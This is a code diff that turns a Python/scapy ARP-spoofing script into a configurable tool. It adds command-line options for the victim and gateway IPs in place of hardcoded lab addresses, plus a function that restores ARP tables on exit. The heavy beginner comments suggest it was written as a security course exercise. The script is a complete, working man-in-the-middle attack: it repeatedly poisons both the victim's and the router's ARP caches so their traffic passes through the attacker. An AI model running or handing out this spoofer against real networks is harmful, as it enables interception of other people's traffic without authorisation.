@@ -4,8 +4,29 @@
 import scapy.all as scapy
 #time allow us to make our code wait an amount of time
 import time
+#argparse allow us input arguments
+import argparse
 
-
+#function that creates arguments inputs for the user to enter the IP of the victim and the ip of the gateway
+def get_argument():
+    #We create an object of argparse
+    parser = argparse.ArgumentParser()
+    #We store the values of the target IP 
+    parser.add_argument("-t", "--target", dest= "target", help= "The IP of the target/victim to spoof. EX: 10.0.2.5")
+    #We store the values of the tIP gateway
+    parser.add_argument("-g", "--gateway", dest= "gateway", help= "The IP of the device gateway. EX: 10.0.2.1")
+    #We capture the arguments
+    args = parser.parse_args()
+    #We make sure the arguments are not empthy
+    if not args.target:
+        #code to handle the error
+        raise argparse.ArgumentTypeError("[-] Please specify the IP of the target/victim, use --help for more info")   
+    elif not args.gateway:
+        #code to handle the error
+        raise argparse.ArgumentTypeError("[-] Please specify an IP of the gateway, use --help for more info")
+    else:
+        #If everything is correct we return the arguments
+        return args
 #Function that return the MAC address of an IP 
 def get_mac(ip):
     #this send an ARP request to the ip range provided
@@ -28,6 +49,23 @@ def spoof(target_ip, spoof_ip):
     #Send the packet to the target
     scapy.send(packet, verbose= False)
 
+#function that restore the state of the victims device
+def restore(dest_ip, source_ip):
+    #variable that store destination MAc address
+    dest_mac = get_mac(dest_ip)
+    #variable that store the source MAC address
+    source_mac = get_mac(source_ip)
+    #This packet fool the target computer to let them think we are the router
+    packet = scapy.ARP(op=2, pdst= dest_ip, hwdst= dest_mac, psrc= source_ip, hwsrc= source_mac)
+    #Send the packet to the target
+    scapy.send(packet, verbose= False, count=4)
+
+#Call the get argument function to get the inpout of the user
+args = get_argument()
+#variable of the victims IP
+target_ip = args.target
+#gateway of the device
+gateway_ip = args.gateway
 #Variable that count the number of packets sent
 packets_count = 0
 #managing error outputs
@@ -35,15 +73,22 @@ try:
     #This loops keep sending packets to both the victim and the router
     while True:
         #Send packet to the victim to let them think im the router
-        spoof('10.0.2.5','10.0.2.1')
+        spoof(target_ip,gateway_ip)
         #Send packet to the router to let them think im th victim
-        spoof('10.0.2.1','10.0.2.5')
+        spoof(gateway_ip,target_ip)
         #Update the packet counter value
         packets_count = packets_count + 2
         #Print a message to tell the user the number of packets sent and stored in a buffer
         print( "\r[+] Packets sent: " + str(packets_count), end="")
         #Make the code wait 2 second to send packets again
         time.sleep(2)
+#manage the error
 except KeyboardInterrupt:
     #printing information when pressing CONTROL C
-    print("[+] Quitting...")
+    print("\n[-] Quitting...")
+    #restore the victims device to normal
+    restore(target_ip,gateway_ip)
+    #restore the router device to normal
+    restore(gateway_ip,target_ip)
+    #print message that everything is back to normal
+    print("[+] ARP tables restored.\n")
